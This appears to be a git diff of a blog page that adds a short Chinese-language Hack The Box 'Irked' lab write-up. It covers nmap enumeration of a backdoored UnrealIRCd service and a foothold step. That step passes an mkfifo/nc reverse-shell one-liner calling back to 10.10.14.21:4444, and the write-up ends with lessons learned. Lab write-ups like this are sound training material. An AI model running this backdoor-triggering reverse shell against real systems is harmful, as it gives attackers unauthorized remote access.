@@ -103,6 +103,7 @@ document.addEventListener('DOMContentLoaded', function () {
 <li><a href="/htb/htb-linux/Sense-Writeup">Sense Writeup</a></li>
 <li><a href="/htb/htb-linux/Valentine-Writeup">Valentine Writeup</a></li>
 <li><a href="/htb/htb-linux/Irked-Writeup">Irked Writeup</a></li>
+<li><a href="/htb/htb-linux/FriendZone-Writeup">FriendZone Writeup</a></li>
 </ul>
 <h2 id="HTB-Windows">HTB Windows</h2>
 <ul>
@@ -184,6 +185,22 @@ function sidebar_toggle() {
 <p><img src="./0.png" alt=""></p>
 <h2 id="0x01-信息收集">0x01 信息收集</h2>
 <p><img src="./1.png" alt=""></p>
+<h2 id="0x02-枚举">0x02 枚举</h2>
+<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -d -p6697 --script<span class="token operator">=</span>irc-unrealircd-backdoor.nse <span class="token number">10.10</span>.10.117</code></pre>
+<p><img src="./5.png" alt=""></p>
+<h2 id="0x03-立足点">0x03 立足点</h2>
+<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -d -p6697 --script<span class="token operator">=</span>irc-unrealircd-backdoor.nse --script-args<span class="token operator">=</span>irc-unrealircd-backdoor.command<span class="token operator">=</span><span class="token string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.14.21 4444 >/tmp/f &amp;'</span> <span class="token number">10.10</span>.10.117</code></pre>
+<p><img src="./6.png" alt=""></p>
+<h2 id="0x04-提权">0x04 提权</h2>
+<p>exim4 - 4.84-2 看有提权漏洞，实则兔子洞，很坑。<br>
+<img src="./7.png" alt=""></p>
+<p>另辟蹊径，轻松提权。<br>
+<img src="./10.png" alt=""></p>
+<h2 id="0x05-攻击节点">0x05 攻击节点</h2>
+<p>信息收集 -&gt; nmap 漏洞扫描 -&gt; 6697.unrealircd(ircd) -&gt; viewuser 服务执行文件(root)</p>
+<h2 id="0x02-学到什么">0x02 学到什么</h2>
+<h4 id="1、善用-nmap-script-vuln。">1、善用 <code>nmap --script vuln</code>。</h4>
+<h4 id="2、警惕兔子洞，走不通要果断放弃，另辟蹊径。">2、警惕兔子洞，走不通要果断放弃，另辟蹊径。</h4>
 
 </div>
 
